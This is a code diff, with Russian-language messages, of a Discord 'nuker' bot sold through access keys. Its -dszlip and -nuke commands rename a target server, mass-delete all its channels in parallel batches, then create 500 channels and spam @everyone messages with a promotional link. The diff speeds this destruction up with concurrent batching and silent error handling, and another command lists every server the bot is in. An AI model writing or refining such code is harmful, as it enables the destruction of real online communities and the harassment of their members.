@@ -5,7 +5,7 @@ import time
 import os
 import json
 
-bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)
+bot = commands.Bot(command_prefix='-', intents=discord.Intents.all())
 
 OWNER_ID = 1448196738308509739
 keys_db = "keys.json"
@@ -29,71 +29,103 @@ def is_owner(ctx):
 def has_key(user_id):
     return str(user_id) in keys_data
 
-# ── СОБЫТИЯ ──
 @bot.event
 async def on_ready():
-    print(f'✅ {bot.user} готов')
+    print(f'✅ {bot.user} готов к уничтожению')
     await bot.change_presence(activity=discord.Game(name="-dszlip"))
 
-# ── КОМАНДЫ ──
 @bot.command()
 async def dszlip(ctx):
     if not has_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ Нет ключа. Используй -key")
+        await ctx.send("❌ Купи ключ у владельца")
         return
-
+    
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Нужны права админа!")
+        await ctx.send("❌ Нужны права администратора!")
         return
-
-    await ctx.send("💀 zlip ebet")
+    
+    await ctx.send("**ZLIP EBET**")
     
     guild = ctx.guild
     start_time = time.time()
     
-    await guild.edit(name="MOGGED BY ZLIP")
+    # Меняем название
+    try:
+        await guild.edit(name="MOGGED BY ZLIP")
+    except:
+        pass
     
-    for channel in guild.channels:
+    # УДАЛЯЕМ ВСЕ КАНАЛЫ МАКСИМАЛЬНО БЫСТРО (ПАЧКАМИ ПО 200)
+    print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
+    
+    channels = list(guild.channels)
+    total = len(channels)
+    deleted = 0
+    
+    async def delete_channel(ch):
         try:
-            await channel.delete()
+            await ch.delete()
+            return True
         except:
-            pass
+            return False
     
-    SPAM = """@everyone
-MOGGED BY ZLIP
+    batch_size = 200
+    for i in range(0, total, batch_size):
+        batch = channels[i:i+batch_size]
+        results = await asyncio.gather(*[delete_channel(ch) for ch in batch], return_exceptions=True)
+        deleted += sum(1 for r in results if r is True)
+    
+    print(f"✅ Удалено {deleted} каналов")
+    
+    # СОЗДАЕМ 500 КАНАЛОВ ПАРАЛЛЕЛЬНО
+    print("🔥 СОЗДАНИЕ 500 КАНАЛОВ...")
+    
+    SPAM_TEXT = """@everyone
+**MOGGED BY ZLIP**
 https://guns.lol/dszlip
 ВЫ УПАЛИ НА КОЛЕНИ"""
     
-    for i in range(500):
+    created = 0
+    target = 500
+    
+    async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(f"zlip-{i+1}")
-            for _ in range(5):
-                await ch.send(SPAM)
-            await asyncio.sleep(0.05)
+            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
+            await asyncio.gather(*messages)
+            return True
         except:
-            break
+            return False
+    
+    batch_size = 50  # 50 каналов ОДНОВРЕМЕННО
+    for i in range(0, target, batch_size):
+        batch = [create_and_spam(j) for j in range(i, min(i+batch_size, target))]
+        results = await asyncio.gather(*batch)
+        created += sum(results)
     
     elapsed = round(time.time() - start_time, 1)
-    await ctx.send(f"✅ СЕРВЕР УНИЧТОЖЕН\nКаналов: 500\nВремя: {elapsed}с")
+    print(f"✅ Создано {created} каналов за {elapsed}с")
+    
+    await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nВремя: {elapsed}с")
 
 @bot.command()
 async def key(ctx):
-    await ctx.send("🔑 Используй: -activate КЛЮЧ\nПриобрести: @dszlip")
+    await ctx.send("🔑 Купи ключ у владельца @dszlip\nИспользуй `-activate КЛЮЧ`")
 
 @bot.command()
 async def activate(ctx, *, key: str = None):
     if not key:
-        await ctx.send("❌ Использование: -activate КЛЮЧ")
+        await ctx.send("❌ Использование: `-activate КЛЮЧ`")
         return
     
     if key in keys_data.values():
-        await ctx.send("❌ Ключ уже использован")
+        await ctx.send("❌ Этот ключ уже использован")
         return
     
     if len(key) >= 8:
         keys_data[str(ctx.author.id)] = key
         save_keys(keys_data)
-        await ctx.send("✅ Ключ активирован! Используй -dszlip")
+        await ctx.send("✅ Ключ активирован! Используй `-dszlip`")
     else:
         await ctx.send("❌ Неверный ключ")
 
@@ -103,36 +135,52 @@ async def nuke(ctx, guild_id: int = None):
         return
     
     if not guild_id:
-        await ctx.send("❌ Использование: -nuke ID_СЕРВЕРА")
+        await ctx.send("❌ Использование: `-nuke ID_СЕРВЕРА`")
         return
     
     guild = bot.get_guild(guild_id)
     if not guild:
-        await ctx.send(f"❌ Сервер с ID {guild_id} не найден")
+        await ctx.send(f"❌ Сервер с ID `{guild_id}` не найден")
         return
     
-    await ctx.send(f"🔥 НЮК: {guild.name}")
+    await ctx.send(f"🔥 НЮК СЕРВЕРА: **{guild.name}**")
     
-    await guild.edit(name="MOGGED BY ZLIP")
-    for channel in guild.channels:
+    try:
+        await guild.edit(name="MOGGED BY ZLIP")
+    except:
+        pass
+    
+    channels = list(guild.channels)
+    async def delete_ch(ch):
         try:
-            await channel.delete()
+            await ch.delete()
+            return True
         except:
-            pass
+            return False
     
-    SPAM = """@everyone
-MOGGED BY ZLIP
-https://guns.lol/dszlip"""
+    batch_size = 200
+    for i in range(0, len(channels), batch_size):
+        batch = channels[i:i+batch_size]
+        await asyncio.gather(*[delete_ch(ch) for ch in batch], return_exceptions=True)
     
-    for i in range(500):
+    SPAM = "@everyone\nMOGGED BY ZLIP\nhttps://guns.lol/dszlip"
+    
+    created = 0
+    async def create(ch):
         try:
-            ch = await guild.create_text_channel(f"zlip-{i+1}")
-            for _ in range(5):
-                await ch.send(SPAM)
+            c = await guild.create_text_channel(f"zlip-{ch+1}")
+            await asyncio.gather(*[c.send(SPAM) for _ in range(5)])
+            return True
         except:
-            break
+            return False
     
-    await ctx.send(f"✅ {guild.name} уничтожен")
+    batch_size = 50
+    for i in range(0, 500, batch_size):
+        batch = [create(j) for j in range(i, min(i+batch_size, 500))]
+        results = await asyncio.gather(*batch)
+        created += sum(results)
+    
+    await ctx.send(f"✅ **{guild.name}** уничтожен\nСоздано: {created} каналов")
 
 @bot.command()
 async def servers(ctx):
@@ -141,7 +189,7 @@ async def servers(ctx):
     
     msg = ""
     for g in bot.guilds:
-        msg += f"{g.name} | ID: {g.id} | {g.member_count} участников\n"
+        msg += f"**{g.name}** | ID: `{g.id}` | {g.member_count} участников\n"
     
     await ctx.send(f"📊 СЕРВЕРЫ:\n{msg}")
 
@@ -151,7 +199,7 @@ async def genkey(ctx, user: discord.User = None):
         return
     
     if not user:
-        await ctx.send("❌ Использование: -genkey @пользователь")
+        await ctx.send("❌ Использование: `-genkey @пользователь`")
         return
     
     key = f"ZLIP-{int(time.time())}-{user.id}"[:16]
@@ -161,7 +209,7 @@ async def genkey(ctx, user: discord.User = None):
     await ctx.send(f"✅ Ключ выдан: {user.mention}\nКлюч: `{key}`")
     
     try:
-        await user.send(f"🔑 Твой ключ: `{key}`\nИспользуй -activate {key}")
+        await user.send(f"🔑 Твой ключ: `{key}`\nИспользуй `-activate {key}`")
     except:
         pass
 
@@ -171,7 +219,7 @@ async def delkey(ctx, user: discord.User = None):
         return
     
     if not user:
-        await ctx.send("❌ Использование: -delkey @пользователь")
+        await ctx.send("❌ Использование: `-delkey @пользователь`")
         return
     
     if str(user.id) in keys_data:
